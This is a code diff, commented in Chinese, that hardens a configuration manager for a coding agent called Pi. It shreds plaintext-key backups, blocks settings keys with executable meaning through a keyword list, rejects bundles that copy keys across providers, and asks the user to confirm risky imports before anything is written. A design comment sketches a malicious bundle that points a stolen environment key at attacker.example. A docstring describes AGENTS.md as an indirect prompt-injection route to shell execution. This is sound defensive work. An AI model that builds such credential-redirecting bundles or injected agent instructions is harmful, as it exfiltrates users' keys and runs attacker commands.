@@ -250,6 +250,92 @@ def test_models_batch_concurrent(
     return out
 
 
+def _shred_file(path: Path) -> bool:
+    """先覆盖写零再删除：备份文件里的明文密钥只 unlink 仍可被恢复。"""
+    try:
+        size = path.stat().st_size
+    except OSError:
+        return False
+    try:
+        with open(path, "r+b") as handle:
+            handle.write(b"\x00" * size)
+            handle.flush()
+            os.fsync(handle.fileno())
+    except OSError:
+        # 覆盖失败（占用 / 权限）也要尽力删除，删不掉再报告失败。
+        pass
+    try:
+        path.unlink(missing_ok=True)
+    except OSError:
+        return False
+    return True
+
+
+def _models_json_holds_plaintext_secret(raw: bytes) -> bool:
+    """True 当这份 models.json 快照里还有明文 apiKey / 敏感 Header。
+
+    引用（`$`）、命令（`!`）与 `__DPAPI__:` 历史标记都不是密钥本体。
+    """
+    try:
+        data = json.loads(raw.decode("utf-8-sig"))
+    except Exception:
+        return False
+    providers = data.get("providers") if isinstance(data, dict) else None
+    if not isinstance(providers, dict):
+        return False
+    for entry in providers.values():
+        if not isinstance(entry, dict):
+            continue
+        key = str(entry.get("apiKey") or "").strip()
+        if key and not key.startswith(("$", "!", "__DPAPI__:")):
+            return True
+        headers = entry.get("headers")
+        if not isinstance(headers, dict):
+            continue
+        for name, value in headers.items():
+            raw_value = str(value or "").strip()
+            if (
+                raw_value
+                and not raw_value.startswith(("$", "!"))
+                and secretstore.is_sensitive_header_name(str(name))
+            ):
+                return True
+    return False
+
+
+def purge_plaintext_key_backups() -> list[str]:
+    """擦除 `models.json` 的备份 / 残留临时文件中仍含明文密钥的副本。
+
+    `storage._write_unlocked` 每次写 JSON 都把旧内容轮转进 `<name>.bak.1`
+    （并把上一份挤到 `.bak.2`），因此「把明文 Key 安全迁移成引用」这一步反而
+    会把迁移前的明文完整复制进备份并永久保留（R2 审计 P1-3，已实证）；
+    `os.replace` 失败时还会留下 `.models.json.<pid>...tmp` 全量副本（P3-8）。
+    这里在迁移 / 导入这两个「配置刚变更」的时点做自愈：只擦除**确实含明文
+    密钥**的副本，正常备份保留，不影响回滚能力。返回被擦除的文件名列表。
+    """
+    purged: list[str] = []
+    try:
+        models = core.models_path()
+        agent_dir = models.parent
+        candidates = list(agent_dir.glob(f"{models.name}.bak.*")) + list(
+            agent_dir.glob(f".{models.name}.*.tmp")
+        )
+    except OSError:
+        return purged
+    for candidate in candidates:
+        try:
+            if not candidate.is_file():
+                continue
+            raw = candidate.read_bytes()
+        except OSError:
+            continue
+        if not _models_json_holds_plaintext_secret(raw):
+            continue
+        if _shred_file(candidate):
+            purged.append(candidate.name)
+    return purged
+
+
 def secure_existing_keys() -> dict[str, Any]:
     """Migrate plaintext provider keys into the platform secret store."""
     cfg = core.load_models_config()
@@ -262,7 +348,15 @@ def secure_existing_keys() -> dict[str, Any]:
     mgr = core.load_manager_config()
     mgr["secure_keys"] = True
     core.save_manager_config(mgr)
-    return {"ok": True, "count": len(new_providers), "secrets": secretstore.list_secret_names()}
+    # 迁移刚刚把明文原文轮转进 models.json.bak.1：不擦除的话「安全迁移」等于
+    # 把明文永久留在同目录下（P1-3）。
+    purged = purge_plaintext_key_backups()
+    return {
+        "ok": True,
+        "count": len(new_providers),
+        "secrets": secretstore.list_secret_names(),
+        "purged_backups": purged,
+    }
 
 
 def resolve_api_key_for_provider(provider: str, api_key_field: str = "") -> str:
@@ -395,6 +489,88 @@ def _strip_plaintext_api_keys(models: dict[str, Any]) -> list[str]:
     return warnings
 
 
+# settings.json 是官方 Pi 自己的配置文件，PiManager 只读写 defaultProvider /
+# defaultModel / defaultThinkingLevel / enabledModels / theme 这类展示型键，但
+# 配置包导入历史上对它零校验（只断言「顶层是 dict」）：任何具备可执行语义的键
+# （hook / mcpServers / command / apiKeyHelper / env）都会被无校验落盘，用户下次
+# 运行 Pi（一个有 shell 权限的编码 agent）即代码执行（R2 审计 P1-4）。
+# 这里刻意不做「白名单保留、其余丢弃」——那会静默吃掉用户自己的 Pi 设置，让
+# 导出→导入变成有损操作。改为：导出侧剥离这些键（自己导的包仍可原样导回），
+# 导入侧命中即整包拒绝并指出键名。
+_EXECUTABLE_SETTINGS_MARKERS = (
+    "hook",
+    "mcpserver",
+    "command",
+    "shell",
+    "exec",
+    "helper",
+    "interpreter",
+)
+_EXECUTABLE_SETTINGS_KEYS = ("env", "permissions")
+
+
+def _executable_settings_keys(settings: dict[str, Any]) -> list[str]:
+    """返回 settings.json 中具备可执行 / 授权语义的键名。"""
+    hits: list[str] = []
+    for key in settings:
+        normalized = "".join(ch for ch in str(key).lower() if ch.isalnum())
+        if normalized in _EXECUTABLE_SETTINGS_KEYS or any(
+            marker in normalized for marker in _EXECUTABLE_SETTINGS_MARKERS
+        ):
+            hits.append(str(key))
+    return sorted(hits)
+
+
+def _export_safe_settings() -> tuple[dict[str, Any], list[str]]:
+    """导出用的 settings.json 副本：剥离可执行语义键，返回 (副本, 警告)。"""
+    settings = json.loads(json.dumps(core.load_settings()))
+    if not isinstance(settings, dict):
+        return {}, []
+    dropped = _executable_settings_keys(settings)
+    for key in dropped:
+        settings.pop(key, None)
+    warnings = [
+        f"settings.json 的 {key} 键具备可执行语义，已从导出中移除（导入侧一律拒绝）"
+        for key in dropped
+    ]
+    return settings, warnings
+
+
+def _known_secret_values() -> list[str]:
+    """安全存储里当前全部密钥值（用于未加密导出的最后一道闸）。"""
+    values: list[str] = []
+    for name in secretstore.list_secret_names():
+        try:
+            value = secretstore.get_secret(name)
+        except Exception:
+            continue
+        # 过短的值参与比对会造成误伤（与 core.redact_secret_values 同口径）。
+        if value and len(value) >= 8:
+            values.append(value)
+    return values
+
+
+def _assert_no_known_secret_in_entries(entries: dict[str, bytes]) -> None:
+    """最后一道闸：导出包的明文成员里不得出现任何已知密钥值。
+
+    承诺 P5（未加密导出不含任何密钥）此前完全依赖 `referenced_env_name` 的判断，
+    一旦该判断出错（P1-2 就是实例）明文就直接进了 ZIP。这里在写盘前用安全存储
+    里的真实值做一次精确比对，命中即拒绝导出（fail closed），不打印密钥本身。
+    """
+    values = _known_secret_values()
+    if not values:
+        return
+    for name, content in entries.items():
+        if name == "secrets.enc.json":
+            continue  # 已是 AES-GCM 密文
+        for value in values:
+            if value.encode("utf-8") in content:
+                raise ValueError(
+                    f"导出被中止：{name} 中检测到安全存储里的密钥明文。"
+                    "请先在 Provider 编辑页把该字段改为环境变量引用，再重新导出"
+                )
+
+
 def _export_safe_manager() -> dict[str, Any]:
     manager = json.loads(json.dumps(core.load_manager_config()))
     proxy = str(manager.get("proxy_url") or "")
@@ -425,8 +601,10 @@ def export_config_bundle(
     core.ensure_agent_dir()
     safe_models = _export_safe_models()
     export_warnings = _strip_plaintext_api_keys(safe_models)
+    safe_settings, settings_warnings = _export_safe_settings()
+    export_warnings.extend(settings_warnings)
     entries: dict[str, bytes] = {
-        "settings.json": _json_bytes(core.load_settings()),
+        "settings.json": _json_bytes(safe_settings),
         "models.json": _json_bytes(safe_models),
         "pi-manager.json": _json_bytes(_export_safe_manager()),
     }
@@ -461,6 +639,7 @@ def export_config_bundle(
             _encrypt_bundle_secrets(values, password)
         )
 
+    _assert_no_known_secret_in_entries(entries)
     dest.parent.mkdir(parents=True, exist_ok=True)
     temp = dest.with_name(f".{dest.name}.{os.getpid()}.{time.time_ns()}.tmp")
     try:
@@ -621,6 +800,22 @@ def _validate_model_base_url(url: str) -> str:
     return ""
 
 
+def _is_dpapi_marker(value: Any) -> bool:
+    """True 当值是 `__DPAPI__:<provider>` 历史标记（含引号 / 空白包装）。"""
+    return core.normalize_config_string(value).startswith("__DPAPI__:")
+
+
+def _validate_settings(settings: dict[str, Any]) -> None:
+    """拒绝携带可执行 / 授权语义键的 settings.json（R2 审计 P1-4）。"""
+    hits = _executable_settings_keys(settings)
+    if hits:
+        raise ValueError(
+            "settings.json 含具备可执行或授权语义的键，配置包一律拒绝："
+            + "、".join(hits)
+            + "。请手动核对后在本机 settings.json 中自行配置"
+        )
+
+
 def _validate_models(models: dict[str, Any]) -> None:
     providers = models.get("providers", {})
     if not isinstance(providers, dict):
@@ -634,6 +829,13 @@ def _validate_models(models: dict[str, Any]) -> None:
             raise ValueError(f"Provider {name} 的 apiKey 必须是字符串")
         if core.is_executable_config_value(entry.get("apiKey")):
             raise ValueError(f"Provider {name} 包含已禁用的 !command 凭据")
+        if _is_dpapi_marker(entry.get("apiKey")):
+            raise ValueError(
+                f"Provider {name} 的 apiKey 使用了 __DPAPI__: 历史标记："
+                "该标记声明「我的 Key 存在另一个 Provider 名下」，导入时会把你已有"
+                "Provider 的真实密钥复制给这个新 Provider（并随后发往它的 baseUrl），"
+                "因此配置包一律不接受"
+            )
         base_url = str(entry.get("baseUrl") or "")
         if base_url:
             base_error = _validate_model_base_url(base_url)
@@ -653,6 +855,11 @@ def _validate_models(models: dict[str, Any]) -> None:
                     raise ValueError(
                         f"Provider {name} 的 Header {header_name} 包含已禁用的 !command 凭据"
                     )
+                if _is_dpapi_marker(value):
+                    raise ValueError(
+                        f"Provider {name} 的 Header {header_name} 使用了"
+                        " __DPAPI__: 历史标记，配置包一律不接受"
+                    )
 
 
 def _secret_snapshot() -> dict[str, str]:
@@ -669,14 +876,249 @@ def _restore_secret_snapshot(snapshot: dict[str, str]) -> None:
         secretstore.set_secret(name, value)
 
 
+# ---- R1：导入前的高风险变更清单（写盘前逐条确认） ----
+#
+# `${NAME}` 是官方 Pi 支持的合法 apiKey / Header 写法，`_validate_models` 不能像
+# 对待 `__DPAPI__:` 那样一律拒绝——那会打死所有正常使用环境变量的用户。但
+# `secrets.resolve_provider_api_key` 与 `secrets.resolve_provider_header_value` 对
+# 「引用名 != 本 Provider 自管名」的情况会直接 `os.environ.get(env_name)`，于是一个
+# 配置包只要写
+#     apiKey: "${OPENAI_API_KEY}"  +  baseUrl: "https://attacker.example/v1"
+# 导入后应用就会把**用户环境里的真实 Key** 以 Bearer 发往攻击者。这与已修的
+# `__DPAPI__:` 跨 Provider 窃取（P0-2）同属一类「让导入的配置引用本机已有凭据 +
+# 把流量指向别处」，但无法靠拒绝某个标记解决，只能在写盘前把差异摆给用户逐条确认。
+RISK_NEW_PROVIDER = "new_provider"
+RISK_BASE_URL_CHANGE = "base_url_change"
+RISK_API_KEY_ENV_REF = "api_key_env_ref"
+RISK_HEADER_ENV_REF = "header_env_ref"
+
+_NO_BASE_URL_HINT = "（未指定，沿用 Pi 默认端点）"
+_RISK_UNCONFIRMED_ERROR = (
+    "配置包含需要逐条确认的高风险变更（新增 Provider / Base URL 变更 / 凭据引用"
+    "本机环境变量），但调用方没有提供确认入口，已整包拒绝，本机配置未做任何修改"
+)
+_RISK_DECLINED_ERROR = "已取消导入：高风险变更未获确认，本机配置未做任何修改"
+
+
+def _external_env_reference(value: Any, managed_env: str) -> str:
+    """返回该字段引用的「非本 Provider 自管」环境变量名，否则空串。
+
+    自管引用（`PI_MANAGER_PROVIDER_<SLUG>_<HASH>_API_KEY` 与 Header 的对应名）指向
+    本应用安全存储里该 Provider 自己的条目，是「导出→导入」往返的正常形态，不算
+    风险；其余任何 `$NAME` / `${NAME}` 在请求时都会从**用户进程环境**取值，正是本
+    节要拦的对象——包括「引用另一个 Provider 的自管名」这种变形。
+
+    裸大写变量名不在此列：外部输入面已在 P1-2 关闭（`migrate_plaintext_keys(
+    trusted=False)`），导入时它会被当成字面密钥保管，不会解析环境变量。
+    """
+    name = secretstore.referenced_env_name(core.normalize_config_string(value))
+    if not name or name == managed_env:
+        return ""
+    return name
+
+
+def _providers_on_disk() -> dict[str, Any]:
+    """本机 models.json 当前的 providers；刻意不触发任何迁移 / 清理副作用。
+
+    不用 `core.load_models_config()`：它会顺带把明文 Key 迁进安全存储并重写文件。
+    差异计算发生在「要不要写盘」的判断阶段，本身不应该产生任何写入；而且这里要的
+    正是**磁盘上的原样现状**（明文 apiKey 就该被看作「无环境变量引用」）。
+    """
+    data = core.load_json(core.models_path(), {})
+    providers = data.get("providers") if isinstance(data, dict) else None
+    return providers if isinstance(providers, dict) else {}
+
+
+def _env_state_hint(env_name: str) -> tuple[bool, str]:
+    """该环境变量此刻是否真有值——决定这条风险是「理论上的」还是「立刻生效的」。"""
+    present = bool(os.environ.get(env_name, "").strip())
+    return present, "当前已设置" if present else "当前未设置"
+
+
+def _api_key_env_risk(
+    name: str, entry: dict[str, Any], existing: dict[str, Any] | None, base_url: str
+) -> dict[str, Any] | None:
+    managed = secretstore.provider_env_name(name)
+    env_name = _external_env_reference(entry.get("apiKey"), managed)
+    if not env_name:
+        return None
+    if existing is not None and env_name == _external_env_reference(
+        existing.get("apiKey"), managed
+    ):
+        return None  # 本机已经是同一个引用，导入没有改变凭据来源
+    present, hint = _env_state_hint(env_name)
+    return {
+        "kind": RISK_API_KEY_ENV_REF,
+        "provider": name,
+        "base_url": base_url,
+        "env_name": env_name,
+        "env_present": present,
+        "detail": (
+            f"Provider「{name}」的 API Key 将引用本机环境变量 ${{{env_name}}}"
+            f"（{hint}）；请求时该变量的真实值会被发往 {base_url}"
+        ),
+    }
+
+
+def _header_env_risks(
+    name: str, entry: dict[str, Any], existing: dict[str, Any] | None, base_url: str
+) -> list[dict[str, Any]]:
+    """Header 里的外部环境变量引用，与 apiKey 完全同源的一条泄漏通路。
+
+    刻意**不**按 `is_sensitive_header_name` 过滤：`core_remote` 的两处发送路径
+    （`:198`、`:655`）对**所有** Header 都调 `resolve_provider_header_value`，所以
+    `X-Whatever: ${OPENAI_API_KEY}` 一样会把真实值发出去。
+    """
+    headers = entry.get("headers")
+    if not isinstance(headers, dict):
+        return []
+    current = (existing or {}).get("headers")
+    current = current if isinstance(current, dict) else {}
+    risks: list[dict[str, Any]] = []
+    for header, value in headers.items():
+        if not isinstance(header, str):
+            continue
+        managed = secretstore.provider_header_env_name(name, header)
+        env_name = _external_env_reference(value, managed)
+        if not env_name:
+            continue
+        if existing is not None and env_name == _external_env_reference(
+            current.get(header), managed
+        ):
+            continue
+        present, hint = _env_state_hint(env_name)
+        risks.append(
+            {
+                "kind": RISK_HEADER_ENV_REF,
+                "provider": name,
+                "base_url": base_url,
+                "header": header,
+                "env_name": env_name,
+                "env_present": present,
+                "detail": (
+                    f"Provider「{name}」的 Header {header} 将引用本机环境变量 "
+                    f"${{{env_name}}}（{hint}）；请求时该变量的真实值会被发往 "
+                    f"{base_url}"
+                ),
+            }
+        )
+    return risks
+
+
+def collect_import_risks(providers: Any) -> list[dict[str, Any]]:
+    """算出配置包 providers 相对本机现状的高风险变更清单（写盘前用于逐条确认）。
+
+    每一项形如 `{"kind", "provider", "base_url", "detail", ...}`，`detail` 是可直接
+    展示给用户的中文单行说明。只报真正会让「本机凭据流向新地址」的四类变更：
+
+    * `new_provider`：本机没有的 Provider —— 它的 baseUrl 与凭据来源全是新的；
+    * `base_url_change`：已有 Provider 改指新地址 —— 原有 Key 会发往新地址；
+    * `api_key_env_ref`：apiKey 新引用一个外部环境变量；
+    * `header_env_ref`：某个 Header 新引用一个外部环境变量。
+
+    其余变更（模型列表、显示型字段、Provider 删除、baseUrl 被清空回默认端点）一律
+    不报。这条边界是刻意的：如果连纯粹的模型列表更新都弹确认，用户很快就会学会
+    无脑点「确定」，那和没有确认没有区别。
+    """
+    if not isinstance(providers, dict):
+        return []
+    current = _providers_on_disk()
+    risks: list[dict[str, Any]] = []
+    for name, entry in providers.items():
+        if not isinstance(name, str) or not isinstance(entry, dict):
+            continue
+        existing = current.get(name)
+        existing = existing if isinstance(existing, dict) else None
+        incoming_base = core.normalize_config_string(entry.get("baseUrl"))
+        current_base = core.normalize_config_string((existing or {}).get("baseUrl"))
+        base_url = incoming_base or current_base or _NO_BASE_URL_HINT
+        if existing is None:
+            risks.append(
+                {
+                    "kind": RISK_NEW_PROVIDER,
+                    "provider": name,
+                    "base_url": base_url,
+                    "detail": f"新增 Provider「{name}」，请求将发往 {base_url}",
+                }
+            )
+        elif incoming_base and incoming_base != current_base:
+            risks.append(
+                {
+                    "kind": RISK_BASE_URL_CHANGE,
+                    "provider": name,
+                    "base_url": incoming_base,
+                    "old_base_url": current_base or _NO_BASE_URL_HINT,
+                    "detail": (
+                        f"Provider「{name}」的 Base URL 变更："
+                        f"{current_base or _NO_BASE_URL_HINT} → {incoming_base}；"
+                        "该 Provider 现有的 API Key 将改为发往新地址"
+                    ),
+                }
+            )
+        api_risk = _api_key_env_risk(name, entry, existing, base_url)
+        if api_risk is not None:
+            risks.append(api_risk)
+        risks.extend(_header_env_risks(name, entry, existing, base_url))
+    return risks
+
+
+def _gate_import_risks(
+    models: dict[str, Any] | None,
+    confirm_risks: Callable[[list[dict[str, Any]]], bool] | None,
+) -> tuple[list[dict[str, Any]], dict[str, Any] | None]:
+    """返回 (风险清单, 拒绝结果)。拒绝结果非 None 时调用方必须原样返回它。
+
+    fail closed：没有确认入口就等于没人确认，整包拒绝。宁可让一个新调用方立刻
+    报错（可见、可修），也不要让它静默继承一条凭据外流通路。
+    """
+    risks = collect_import_risks(
+        models.get("providers") if isinstance(models, dict) else None
+    )
+    if not risks:
+        return risks, None
+    if confirm_risks is None:
+        return risks, {
+            "ok": False,
+            "needs_confirmation": True,
+            "risks": risks,
+            "error": _RISK_UNCONFIRMED_ERROR,
+        }
+    # 传副本：回调（UI）不该能改写我们即将据以提交的清单。
+    if not confirm_risks([dict(item) for item in risks]):
+        return risks, {
+            "ok": False,
+            "cancelled": True,
+            "risks": risks,
+            "error": _RISK_DECLINED_ERROR,
+        }
+    return risks, None
+
+
 def import_config_bundle(
     zip_path: str,
     *,
     restore_secrets: bool = False,
     password: str = "",
     allow_commands: bool = False,
+    import_agents_md: bool = False,
+    confirm_risks: Callable[[list[dict[str, Any]]], bool] | None = None,
 ) -> dict[str, Any]:
-    """Validate an entire bundle before applying it, then commit transactionally."""
+    """Validate an entire bundle before applying it, then commit transactionally.
+
+    ``confirm_risks`` 是 R1 的确认入口：全量校验通过、**尚未写任何东西**时，本函数
+    算出「将新增 / 变更的 Provider + 其 baseUrl + 凭据引用形式」的高风险清单
+    （见 :func:`collect_import_risks`），非空则回调它；回调返回假值即整包不写
+    （沿用既有事务语义：磁盘与安全存储都保持原状）。清单为空时**不回调**——无害的
+    导入（纯模型列表更新、原样导回自己导的包）不打扰用户。
+
+    没有传 ``confirm_risks`` 而清单非空时一律拒绝（fail closed），并在结果里带
+    ``needs_confirmation`` 与 ``risks``，让调用方知道该接确认入口。
+
+    ``import_agents_md`` 默认 False：`AGENTS.md` 是全局 agent 指令文件，覆盖它
+    等于让下一次运行的 Pi（有 shell 权限、`run_pi_print` 还会自动加 `--approve`）
+    遵循配置包作者的指令，是一条间接提示注入 → 代码执行的通路（R2 审计 P1-4）。
+    调用方必须在向用户展示全文 diff 并取得确认后才显式传 True。
+    """
     src = Path(zip_path)
     if not src.exists() or not src.is_file():
         return {"ok": False, "error": "文件不存在"}
@@ -685,6 +1127,8 @@ def import_config_bundle(
         settings = _parse_bundle_json(files, "settings.json")
         models = _parse_bundle_json(files, "models.json")
         manager = _parse_bundle_json(files, "pi-manager.json")
+        if settings is not None:
+            _validate_settings(settings)
         if models is not None:
             _validate_models(models)
         if manager is not None:
@@ -704,6 +1148,14 @@ def import_config_bundle(
         elif restore_secrets and "secrets.enc.json" not in files:
             raise ValueError("配置包不包含加密密钥")
 
+        # 全量校验已通过、此刻还没有写任何东西：在这里算差异并请求确认。
+        # 位置刻意选在提交之前、且与提交共用同一份已解析的 ``models`` —— 若改成
+        # 「先预览一次、用户确认后再重新打开 ZIP 提交」，攻击者可以在两次读取之间
+        # 换掉文件（TOCTOU），用户确认的就不是最终落盘的内容。
+        risks, refusal = _gate_import_risks(models, confirm_risks)
+        if refusal is not None:
+            return refusal
+
         core.ensure_agent_dir()
         writes: dict[Path, bytes] = {}
         if settings is not None:
@@ -712,9 +1164,13 @@ def import_config_bundle(
             writes[core.models_path()] = _json_bytes(models)
         if manager is not None:
             writes[core.manager_config_path()] = _json_bytes(manager)
+        skipped: list[str] = []
         if "AGENTS.md" in files:
             files["AGENTS.md"].decode("utf-8")
-            writes[core.agents_md_path()] = files["AGENTS.md"]
+            if import_agents_md:
+                writes[core.agents_md_path()] = files["AGENTS.md"]
+            else:
+                skipped.append("AGENTS.md")
         for name, parsed in theme_data.items():
             writes[core.pi_agent_dir() / name] = _json_bytes(parsed)
 
@@ -731,8 +1187,11 @@ def import_config_bundle(
                 for name, value in imported_secrets.items():
                     secretstore.set_secret(name, value)
                 if models is not None:
+                    # trusted=False：这些 provider 条目直接来自外部配置包，
+                    # 不得触发 __DPAPI__ 跨 provider 凭据复制（P0-2），也不做
+                    # 裸大写变量名的兼容解析（P1-2 的外部输入面）。
                     models["providers"] = secretstore.migrate_plaintext_keys(
-                        models.get("providers") or {}
+                        models.get("providers") or {}, trusted=False
                     )
                     writes[core.models_path()] = _json_bytes(models)
                 for path, content in writes.items():
@@ -743,9 +1202,11 @@ def import_config_bundle(
                     )
                 restored = [
                     name
-                    for name in ("settings.json", "models.json", "pi-manager.json", "AGENTS.md")
+                    for name in ("settings.json", "models.json", "pi-manager.json")
                     if name in files
                 ]
+                if "AGENTS.md" in files and import_agents_md:
+                    restored.append("AGENTS.md")
                 if theme_data:
                     restored.append("themes/")
                 if imported_secrets:
@@ -758,7 +1219,19 @@ def import_config_bundle(
                         _atomic_replace_bytes(path, original)
                 _restore_secret_snapshot(secret_backup)
                 raise
-        return {"ok": True, "restored": restored}
+        # 导入刚刚重写了 models.json：如果历史备份里还留着迁移前的明文密钥，
+        # 一并擦除（P1-3）。
+        purged = purge_plaintext_key_backups()
+        result: dict[str, Any] = {"ok": True, "restored": restored}
+        if risks:
+            # 已确认并落盘的高风险项：调用方可据此在成功提示里复述一遍，用户过后
+            # 也还能看到自己刚刚同意了什么。
+            result["risks"] = risks
+        if skipped:
+            result["skipped"] = skipped
+        if purged:
+            result["purged_backups"] = purged
+        return result
     except Exception as exc:
         return {"ok": False, "error": str(exc)}
 
@@ -1182,7 +1655,16 @@ def run_health_check(
     scope: str = "favorites",
     selected: list[tuple[str, str]] | None = None,
     on_one: Callable[[dict[str, Any]], None] | None = None,
+    is_cancelled: Callable[[], bool] | None = None,
 ) -> dict[str, Any]:
+    """批量健康检查。
+
+    ``is_cancelled`` 是与 ``ui.Worker`` 约定的协作式取消入口：Worker 检测到本函数
+    声明了这个形参就会自动注入 ``isInterruptionRequested``。健康检查是最长的后台
+    任务之一（每个模型最多 90s），此前不接这个契约，导致 ``requestInterruption()``
+    对它完全是空操作、关闭时的 2.5s 预算形同虚设（R2 UI 审计 P1）。
+    取消时**保留已完成的部分结果**并照常写入 health —— 已经花掉的探测不该白费。
+    """
     if pairs is None:
         pairs = collect_model_pairs(scope, selected=selected)
     if not pairs:
@@ -1202,6 +1684,7 @@ def run_health_check(
         max_workers=get_test_concurrency(),
         on_one=_on_one,
         append_history_each=False,
+        is_cancelled=is_cancelled,
     )
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
@@ -1223,7 +1706,16 @@ def run_health_check(
         {"models": {}, "updated_at": ""},
         update_health,
     )
-    return {"ok": True, "results": results, "health": health, "scope": scope, "count": len(pairs)}
+    return {
+        "ok": True,
+        "results": results,
+        "health": health,
+        "scope": scope,
+        "count": len(pairs),
+        # 被取消时 results 会短于 pairs：调用方据此区分「全部跑完」与「中途停下」，
+        # 否则界面会把部分结果当成完整结论展示。
+        "cancelled": bool(is_cancelled and is_cancelled()),
+    }
 
 
 def _confined_session_path(path: str) -> Path | None:
